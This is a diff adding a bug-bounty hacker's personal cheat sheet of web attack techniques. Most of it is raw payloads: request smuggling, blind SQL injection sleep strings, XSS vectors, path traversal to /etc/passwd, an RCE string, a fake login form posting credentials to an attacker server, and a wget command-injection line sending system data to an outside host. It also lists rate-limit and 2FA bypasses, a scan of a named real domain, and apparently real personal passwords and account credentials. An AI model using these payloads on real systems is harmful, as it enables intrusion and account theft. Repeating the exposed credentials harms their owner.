@@ -1,0 +1,418 @@
+
+
+
+Login { 
+       HTTP Request Smuggling {
+GET /file HTTP/1.1
+Transfer-Encoding:chunked@
+Content-Length: 1
+
+0
+
+GET /404plz HTTP/1.1
+}
+        bypass open redirect  login?next=%09/zeit.co%09@google.com&gh=1
+       no rate limit lead to account take over https://hackerone.com/reports/410451
+	   login csrf https://hackerone.com/reports/577920  https://hackerone.com/reports/774
+
+    Login csrf http://andrisatteka.blogspot.com/2014/01/the-threat-of-login-csrf.html?m=1
+	Reset Password {
+		Email Link Poinsing - Host Header Injection > X-Forwarded-Host: evil.fr | Change Host
+		No Rate Limiting > Inturder 
+		Users Enumerition > Inturder
+		Token Not Expired After  Use
+		Session Not Expired After Reset Password
+		Token Leakage via referer
+                CBC attack
+                SSTI on host header 
+                change Id (IDOR)
+                Race condition 
+                Include your mail as a second parametre  (email=victim&email=attacker) 
+                brute force numeric token using ip rotator
+                try to use your reset token on target's account
+                try to figure out how the tokens are generated : 
+                                                      -generated besed on Timestamp
+                                                      -generated on the id of the user
+                                                      -generated based of the email of the user
+                
+                 
+		
+	}
+	Sign In Feature {
+            
+            best reports : https://h1.security.nathan.sx/
+            XXE : {!xmlparser v="<!DOCTYPE a SYSTEM 'your_burp_collab'>"}
+	    RTLO character in file names https://hackerone.com/reports/210354
+	    Blind SQLi payload (select(0)from(select(sleep(25)))v) 
+                               'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+                                %20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh)
+                                desc%2c(select*from(select(sleep(30)))a)
+                                 res_id=51-CASE/**/WHEN(LENGTH(?version()?)=?10?)THEN(SLEEP(6*1))END
+                                 '-if(1=2,'0','1')-'   (will changr respense length)
+                                  +or+sleep(0.000000001)
+	    Xss in sticker smille https://hackerone.com/reports/54719
+	    Open redirect { #/path///google.com >> window.location.href.indexOf('#/path') }
+		No Rate On Login > Brute Force Password Of Account
+		Session Fixation > Sign In With Cookies
+		Open Redirect
+		atlassian confluence XSS --> pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E.vm 
+		Json hijacking 
+		2-factor authentication can be disabled when logged in without confirming account password
+		No password length restriction {https://hackerone.com/reports/167351}
+		XSS
+		Http Supported
+		Email boomber using bing Host header
+		Upload functionality {ImageMagic RCE, .php.jpg, .php%00.png, exif RCE, path traversal, }
+		overwrite files in same folder 
+		path traversal
+		web cach deception
+		XXE
+		FFMPEG HLS parse LFI
+		IDOR
+		Override images , files or data of other users 
+		CSRF 
+		Apache HTTP server is vulnerable to (Leakage Token_Username)
+		Apache HTTP server is vulnerable to (Remote Code Injection)
+		PHP Server Versions is vulnerable to (CVEE-Search ur version cvee)
+		CORS Misconfiguration in Reset_Password - leads to (Leakage User / Account Take Over)
+		CORS Misconfiguration in Login User - leads to (Leakage Sensitive data)
+		OBSERVED DATA - Project Disclosure - leads to (Template-Injection) / Github/Gitlab 
+		Sensitive Exposure - in (/wp-json/wp/v2/users) - leads to attacker bruteforce password admin in xmlrpc_decode_request
+		wordpress lfi wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php
+		Open Redirect in Login/Signup/Register (reflected using csrf)
+		Open Redirect in Reset_Password (self)
+		Admin Login Authorization - Leads to file path disclosure web server (Using Recon)
+		and many others you can see here: https://drive.google.com/file/d/1TKXET93wdS1yJZZwa9pDuj9_yZVzg1Kk/view
+		aspnet error XSS https://hackking.net/threads/asp-net-request-querystring-xss-filter-bypass-convert-reflected-xss-to-stored-xss.17/?fbclid=IwAR3N0fLw4Ty_LwidKo-0owAPGMg0RoMkFO1YwgpQiXpE0Ej2doa5AA-lUf4
+                url link spoofing : https://hackerone.com/reports/837729{
+                  -http://example.com
+                  +<http://evil.com|http://example.com>
+                   }
+                   
+		
+	}
+	SignOauth {
+		Steal Token User with {
+			Openredirect on redirect_uri in third part
+			to any place in redirect_uri like redirect_uri=http://target.com/anyplace
+			?next=/fbcode../youpost
+                         bypass redirect uri using whitelisted.com%09.evil.com
+                         %252e  %0d%0a
+		}
+	}
+	Logout {
+		Session Not Expired After Logout and no password displayed
+		Session Not Expired After Change Password
+		Open Redirect
+	}
+	SignUp {
+                sign up bugs https://hackerone.com/reports/360171
+	        ticketing trick
+		No Rate On SignUp
+		No Rate On Send Confirme Account
+		No Weak Password
+		SQLi OOB 
+		Failed Certificate Validation  https://hackerone.com/reports/16568
+	}
+	2FA Bypass {
+		Bypass Via Brute Force
+		Bypass Via Reset Password
+		Bypass Via Login In App
+}
+
+Profile {
+	Invite Friends {
+	    link for accept disclosed in admin side 
+		link for accept dont expired 
+		IDOR 
+		HyperLink Injection > Change Your Full Name To https://www.evil.com
+		No Rate Limit On Invite Friends
+		Email Html Injection
+	    Invite friend and reward { 
+		Race Condition 
+		}
+		parameter tampering ({email={["victime@email.xx","attacker@email.xx"]}})
+	}
+	EditProfile {
+		Steal User Information Via ClickJacking [ api/users/ ]
+		Internal Ip disclosure On [ /wp-json/wp/v2/pages ]
+		IDOR 
+		Try Template  Injection [ Name : {{7*7}} ]
+		XSS VIA NAME OF FILE IMAGE
+		Xss Svg
+		No Rate On Upload > images | files
+		Number Phone > No Rate on Send Code Verfication
+		Delete Account Without Password 
+		ClickJacking On EditProfile And Delete Account 
+		CSRF IN Connect Facebook-Twitter...
+		SSTI Injection
+		ImageMagick {
+			RCE
+			Information Disclosure 
+		}
+	}
+}
+
+Bypass Rate Limiting: {
+  X-Originating-IP:IP
+  X-Forwarded-For:IP
+  X-Remote-IP:IP
+  X-Remote-Addr:IP
+  X-Client-IP:IP
+  X-Host:IP
+  X-Forwarded-Host:IP
+
+
+my password: T00r3tra200!    TYyuziout1645@!.
+
+
+nmap 
+
+ nmap -sV -sC -Pn -p 1-65535 -T5 --min-rat  162.241.157.98                                                                                                                             e 1000 --max-retries 5 coinfinity.co
+
+
+wp-admin/load-scripts.php = DOS --> https://hackerone.com/reports/752010
+
+bypasses : 
+
+403 forbidden :
+
+X-Original-URL or X-Rewrite-URL   bookmarklet
+/admin..;/  200 ko
+price manipulation : 
+manipulate controllable parametre.
+set quantity to 0.1 .
+add .json to the endpoint .
+add two slashes //private after fix try /%2fprivate
+bypass using http verb {ANYTHING /admin/ = 200 GET /admin/ = 401} 
+
+Githu dorks : 
+
+api_key
+“api keys”
+authorization_bearer:
+oauth
+auth
+authentication
+client_secret
+api_token:
+“api token”
+client_id
+password
+user_password
+user_pass
+passcode
+client_secret
+secret
+password hash
+OTP
+user auth
+
+
+
+
+shodan life time credentials : 
+Yukusawa18
+ayoubyukusawa
+
+
+XSS bypasses : 
+             data:text/html,<script>alert(0)</script>
+			 \x54\x68\x69\x6e\x6b\x20\x61\x67\x61\x69\x6e\x21! 
+
+
+
+XSS vector chat message:  <svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
+			 
+			 
+
+		
+html injection
+<div style="position: fixed;z-index: 9998; width: 100%;height: 100%;top:0; left: 0;background: #000000; opacity: 0.6"></div> <form action="http:AttackerServer" method="POST" style="text-align:center;background-color: #00adef;z-index: 9999;position: fixed;top: 200px;left: 25%;width: 800px;height: auto;padding: 10px;"> <h2>You Have To Sign To See This Page</h2> Email:<br> <input type="email" name="email" placeholder="Enter Your Email" style="width: 90%;height: 40px;border: none;border-radius: 25px;text-align: center;margin: 10px 0; "><br> Password:<br> <input type="Password" name="pass" placeholder="Enter Your Password" style="width: 90%;height: 40px;border: none;border-radius: 25px;text-align: center;margin: 10px 0;"><br> <input type="submit" value="Submit" style="background-color: #ffffff;color: #8e99a3;border: none;border-radius: 20px;"> </form>
+				 
+
+path traversal 
+..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd 
+
+
+get victim ip 
+https://medium.com/@iframe_h1/a-picture-that-steals-data-ff604ba1012
+
+
+
+
+apache tomcat exploits 
+https://www.exploitalert.com/search-results.html?search=Apache+Tomcat
+
+
+
+
+remote code execution payloads : 
+${@print(system("pwd"))}
+
+
+
+
+recon : 
+
+curl -s https://crt.sh\?q\=\%25.cainiao.com\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe | tee -a
+
+ HTTP REQUEST SMUGGLING
+
+Transfer-Encoding: chunked
+
+0
+
+
+burp  scope
+
+.*\.test\.com$
+
+
+
+
+
+
+
+
+XSS Breaking :
+https://d3adend.org/xss/ghettoBypass
+
+
+
+hacking s3 buckets : a.png?AWSAccessKeyId=[valis-acess-key-id]&Expires=2123456789&signature=
+
+
+
+
+
+Gsuite talk : https://docs.google.com/presentation/d/e/2PACX-1vQXFAlzQctBpdeclp-rMCkflh-sNeVezktNqlwOoRMQxdAWNNlRsBUtlVHIIPDqu3hazL_UxDhShhEW/pub?slide=id.g649f2b946c_0_91
+
+
+~ Broken Link Checker
+
+subfinder -d target > subs.txt ; cat subs.txt | httprobe | tee http.txt ; cat http.txt | waybackurls | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | tee wdata.txt ; cat wdata.txt | burl | tee brokenlink.txt
+
+https://github.com/tomnomnom/burl
+
+
+1 add %00 at the end of mail in intruder whenever error 429 comes 
+Or %2e,%0d,%0a
+2 add X-Forwarded-For: 127.0.0.1
+If  rate limit is based on ip use ip rotator burp extention 
+
+
+
+
+
+
+Bypass Rate Limit : 
+1. IP Rotate Method
+2. IP Spoofing Through Client-IP Headers [ X-Forwarded-For... ]
+3. Fuzz on parameter Value Through %00 %0d Space ..
+4. HTTP Parameter Manipulation
+5. Add Random Value to The endpoint on each request such [ /api/login?18d48d84d48 , /api/login?18d48d84559d5d5]
+
+Bypass 2FA : 
+1. Brute Force The 2FA-Code due to lack rate limit
+2. Bypass The Rate Limit on 2FA Through Bypass-Rate-Limit Techniques
+3. Using Null Value
+4. Force Browsing [ http://www.x.com/profile ]
+5. Using Log into The profile through Reset Password And OAUTH
+6. Using Old API & OLD-Activitation URL And Another Ways to SIGNUP Such API/SOAP & Another Subdomains & Android,IOS Application
+7. Disable 2FA Through CSRF
+8. Disable 2FA Through Make an request to The endpoint of Add 2FA & Old Sessions didnt expired
+
+OAUTH : 
+Open Redirect On redirect_uri
+Try Bypass Filter With : 
+   %09 - %2509
+   %2e - %252e
+   \@ - %5c%40...
+   http: , // , \\ 
+   IDN Homograph [ è,š,û ]
+   FUZZ With URL-Encode On subdomain [ https://googleFUZZ.target.com ] and on Last URL SUch https://target.comFUZZx
+   FUZZ With CCTLD And Gtld
+2. CSRF On OAuth Login By [ For Chaining In Future ] : Delete State Parameter Or Value
+3. Steal Oauth Token Through Referer [ Via URL Or Img Or Website Tracker such Google analystic ] [ When Theres None-Open redirect in redirect_uri ] : redirect_uri=http://target.com/Post
+4. Xss Through redirect_uri
+
+
+
+
+pentesting user interface in email send : 
+https://www.virtuesecurity.com/pentesting-user-interfaces/
+
+
+wordpress attack
+
+https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning
+
+
+Extension list for File upload bugs 
+
+ASP: ".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap", ".vbhtm", ".vbhtml", ".asa", ".asp", ".cer", "shtml"
+
+
+https://groups.malaysiaairlines.com/index.php?confirmationCode=testers%27));)};alert%3C/script%3E%3Clink%20href=%22https://secmind.000webhostapp.com/test.js%22%3E%3C/link%3E%3C!---//
+
+
+
+
+
+How to find authentication bypass vulnerabilities.
+Focus. I Added headers.
+
+Request
+GET /delete?user=test HTTP/1.1
+Response
+HTTP/1.1 401 Unauthorized
+
+Reqeust
+GET /delete?user=test HTTP/1.1
+X-Custom-IP-Authorization: 127.0.0.1
+Response
+HTTP/1.1 302 Found
+
+
+
+
+
+APi endpoints worlist : 
+
+
+https://twitter.com/HackersOnDemand/status/1291660577790722048/photo/1
+
+
+
+
+
+The next level of automation in recon is targeted content discovery / directory bruteforcing for CVE's ++. Want a good start on these fingerprints/ templates? They exist!
+
+https://github.com/projectdiscovery/nuclei-templates
+
+https://github.com/1N3/Sn1per/tree/master/templates
+https://github.com/Static-Flow/gofingerprint/blob/master/fingerprints/fingerprints.json
+https://github.com/sullo/nikto/tree/master/program/databases
+
+
+RCE on image upload
+JPG;sleep 23;wget --header=secalertPoC:$(uname -a|tr -d "") http://burpcollaboratorlink
+
+
+
+
+awesome burp extensions 
+https://github.com/snoopysecurity/awesome-burp-extensions
+
+
+
+best website fir bug hunter
+
+https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
+
+
+
+
+admin trick 
+add the following parametre to the authentification enpoint :  admin=true&org_admin=true
